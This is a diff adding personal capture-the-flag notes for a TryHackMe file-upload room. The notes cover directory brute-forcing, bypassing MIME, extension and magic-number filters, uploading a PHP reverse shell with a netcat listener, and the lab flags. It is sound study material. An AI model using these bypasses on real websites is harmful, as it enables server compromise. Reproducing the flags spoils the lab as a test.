@@ -1,8 +1,106 @@
-Task 5 Remote Code Execution 
+#Task 5 Remote Code Execution 
 hint:
 gobuster dir -u http://shell.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
 ffuf -u http://shell.uploadvulns.thm/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 dirb http://shell.uploadvulns.thm/ /usr/share/wordlists/dirb/common.txt
+
+#Task 7  Bypassing Client-Side Filtering
+hint:
+run http://java.uploadvulns.thm/ --> view source
+--> click http://java.uploadvulns.thm/assets/js/client-side-filter.js
+....
+if (file.type != "image/png")
+...
+only upload file images/png
+
+ffuf -u http://java.uploadvulns.thm/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://java.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+dirb http://java.uploadvulns.thm/ /usr/share/wordlists/dirb/common.txt 
+...
+/images
+/assets
+
+on my machine: open Burp
+firefox --> Burp proxy ---> run http://java.uploadvulns.thm ---> upload file shell.png
+(with file shell.png rename from shell.php)
+---upload success
+On proxy tab of Burp with (POST / HTTP/1.1)
+change image/png --> text/x-php
+shell.png ---> shell.php
+then forward the request to the server
+
+on firefox view http://java.uploadvulns.thm/?submit=success
+open chrome run http://java.uploadvulns.thm/images
+shell.php
+on my machine: nc -lnvp 1234
+run http://java.uploadvulns.thm/shell.php
+$cat /var/www/flag.txt
+
+What is the flag in /var/www/?
+THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}
+
+
+#Task 8  Bypassing Server-Side Filtering: File Extensions
+gobuster dir -u http://annex.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+ffuf -u http://annex.uploadvulns.thm/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/privacy
+/assets
+test upload file .php
+alarm: File type is invalid
+test upload file images --->ok
+
+
+File Upload General Methodology
+Other useful extensions:
+PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
+ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+Coldfusion: .cfm, .cfml, .cfc, .dbm
+Flash: .swf
+Perl: .pl, .cgi
+Erlang Yaws Web Server: .yaws
+
+rename shell.php to shell.php4 -->upload
+alarm: File type is invalid
+
+rename shell.php to shell.php5 -->upload --->ok
+
+view http://annex.uploadvulns.thm/privacy/
+on my machine: nc -lnvp 1234
+
+run http://annex.uploadvulns.thm/privacy/shell.php5
+
+$cat /var/www/flag.txt
+
+- What is the flag in /var/www/?
+THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}
+
+#Task 9  Bypassing Server-Side Filtering: Magic Numbers
+gobuster dir -u http://magic.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+ffuf -u http://magic.uploadvulns.thm/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/graphics
+/assets
+
+upload test file .jpg ---> invalid
+--> view-source:http://magic.uploadvulns.thm/?submit=invalid
+GIFs only please!
+
+search gif on https://en.wikipedia.org/wiki/List_of_file_signatures
+edit file shell.php ---> add AAAAAA on head
+open hexeditor change AAAAAA(41 41 41 41 41 41) to 47 49 46 38 37 61
+
+run http://magic.uploadvulns.thm/graphics/shell.php
+
+
+/content              (Status: 301) [Size: 181] [--> /content/]
+/modules              (Status: 301) [Size: 181] [--> /modules/]
+/admin                (Status: 200) [Size: 1238]               
+/assets               (Status: 301) [Size: 179] [--> /assets/] 
+/Content              (Status: 301) [Size: 181] [--> /Content/]
+/Assets               (Status: 301) [Size: 179] [--> /Assets/] 
+/Modules              (Status: 301) [Size: 181] [--> /Modules/]
+
+
 
 
 https://tryhackme.com/room/uploadvulns
@@ -12,4 +110,5 @@ https://beginninghacking.net/2020/09/23/try-hack-me-upload-vulnerabilities/
 https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/
 https://www.thedutchhacker.com/upload-vulnerabilities-on-tryhackme/
 https://tkushal216.medium.com/upload-vulnerabilities-walkthrough-c80648550efb
+https://book.hacktricks.xyz/pentesting-web/file-upload
 
